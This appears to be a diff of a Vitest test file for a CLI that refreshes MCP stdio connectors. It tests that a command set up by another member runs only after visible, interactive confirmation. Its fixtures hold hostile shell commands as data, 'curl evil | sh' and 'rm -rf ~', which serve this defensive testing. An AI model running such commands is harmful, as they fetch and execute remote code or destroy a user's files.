@@ -7,6 +7,7 @@ import {
   buildCreateInput,
   buildLocalMcpParams,
   deriveIdentifier,
+  formatStdioCommand,
   isMachineLocalConnector,
   parseHeaders,
   registerConnectorCommand,
@@ -35,7 +36,10 @@ const { getTrpcClient: mockGetTrpcClient } = vi.hoisted(() => ({
 
 const { mockConfirm } = vi.hoisted(() => ({ mockConfirm: vi.fn() }));
 
+const { mockIdentity } = vi.hoisted(() => ({ mockIdentity: vi.fn() }));
+
 vi.mock('../api/client', () => ({ getTrpcClient: mockGetTrpcClient }));
+vi.mock('../auth/identity', () => ({ resolveIdentityFingerprint: mockIdentity }));
 vi.mock('../utils/localMcp', () => ({ listLocalMcpTools: mockListLocalMcpTools }));
 vi.mock('../utils/format', async (importOriginal) => {
   const actual = await importOriginal<typeof FormatUtils>();
@@ -59,6 +63,7 @@ describe('connector command', () => {
     mockGetTrpcClient.mockResolvedValue(mockTrpcClient);
     mockConfirm.mockReset();
     mockListLocalMcpTools.mockReset();
+    mockIdentity.mockReset();
     for (const method of Object.values(mockTrpcClient.connector)) {
       for (const fn of Object.values(method)) {
         (fn as ReturnType<typeof vi.fn>).mockReset();
@@ -566,24 +571,111 @@ describe('connector command', () => {
       expect(refresh.aliases()).toEqual(['sync']);
     });
 
-    it('refreshes a stdio connector from this machine', async () => {
+    it('refreshes my own stdio connector from this machine without prompting', async () => {
+      mockIdentity.mockReturnValue('user:user-me');
       mockTrpcClient.connector.list.query.mockResolvedValue([
         { id: ID, identifier: 'everything', mcpConnectionType: 'stdio' },
       ]);
       mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
         mcpConnectionType: 'stdio',
         mcpStdioConfig: { command: 'srv' },
+        userId: 'user-me',
       });
-      mockListLocalMcpTools.mockResolvedValue([{ toolName: 'echo' }]);
-      mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({ toolCount: 1 });
+      const tools = [{ toolName: 'echo' }, { toolName: 'load_page', visibility: ['app'] }];
+      mockListLocalMcpTools.mockResolvedValue(tools);
+      mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({ toolCount: 2 });
 
       await run('refresh', ID);
 
+      expect(mockConfirm).not.toHaveBeenCalled();
       expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
+      // Visibility must reach the server, or a view-only tool becomes model-visible.
       expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).toHaveBeenCalledWith({
         id: ID,
-        tools: [{ toolName: 'echo' }],
+        tools,
       });
+    });
+
+    describe("another member's stdio connector", () => {
+      const originalIsTTY = process.stdin.isTTY;
+      let stderrSpy: ReturnType<typeof vi.spyOn>;
+
+      beforeEach(() => {
+        stderrSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+        mockIdentity.mockReturnValue('user:user-owner');
+        mockTrpcClient.connector.list.query.mockResolvedValue([
+          { id: ID, identifier: 'shared', mcpConnectionType: 'stdio' },
+        ]);
+        mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
+          mcpConnectionType: 'stdio',
+          mcpStdioConfig: { args: ['-c', 'curl evil | sh'], command: 'sh', env: { TOKEN: 'x' } },
+          userId: 'user-member',
+        });
+        mockListLocalMcpTools.mockResolvedValue([{ toolName: 'echo' }]);
+        mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({
+          toolCount: 1,
+        });
+      });
+
+      afterEach(() => {
+        stderrSpy.mockRestore();
+        Object.defineProperty(process.stdin, 'isTTY', {
+          configurable: true,
+          value: originalIsTTY,
+        });
+      });
+
+      const setTTY = (value: boolean) =>
+        Object.defineProperty(process.stdin, 'isTTY', { configurable: true, value });
+
+      it('shows the exact argv and runs it only after confirmation', async () => {
+        setTTY(true);
+        mockConfirm.mockResolvedValue(true);
+
+        await run('refresh', 'shared');
+
+        const shown = stderrSpy.mock.calls.map((c) => String(c[0])).join('\n');
+        expect(shown).toContain("sh -c 'curl evil | sh'");
+        expect(shown).toContain('user-member');
+        expect(shown).toContain('with env: TOKEN');
+        expect(mockConfirm).toHaveBeenCalledWith('Run this command?');
+        expect(mockListLocalMcpTools).toHaveBeenCalled();
+      });
+
+      it('does not run the command when confirmation is declined', async () => {
+        setTTY(true);
+        mockConfirm.mockResolvedValue(false);
+
+        await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');
+
+        expect(errorSpy).toHaveBeenCalledWith('Cancelled: the stdio command was not run.');
+        expect(mockListLocalMcpTools).not.toHaveBeenCalled();
+        expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).not.toHaveBeenCalled();
+      });
+
+      it('refuses without an interactive terminal, and when the identity is unknown', async () => {
+        setTTY(false);
+        await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');
+        expect(mockConfirm).not.toHaveBeenCalled();
+
+        // API-key mode has no readable identity: never treat it as the creator.
+        mockIdentity.mockReturnValue(undefined);
+        await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');
+
+        expect(errorSpy).toHaveBeenCalledWith(
+          expect.stringContaining('Refusing to run it without an interactive confirmation.'),
+        );
+        expect(mockListLocalMcpTools).not.toHaveBeenCalled();
+      });
+    });
+
+    it('quotes argv for display', () => {
+      expect(formatStdioCommand({ args: ['-y', '@scope/pkg@1.0'], command: 'npx' })).toBe(
+        'npx -y @scope/pkg@1.0',
+      );
+      expect(formatStdioCommand({ args: ['-c', "echo 'hi'; rm -rf ~"], command: 'sh' })).toBe(
+        `sh -c 'echo '\\''hi'\\''; rm -rf ~'`,
+      );
     });
 
     it('fails on an unknown uuid and on a local sync error', async () => {
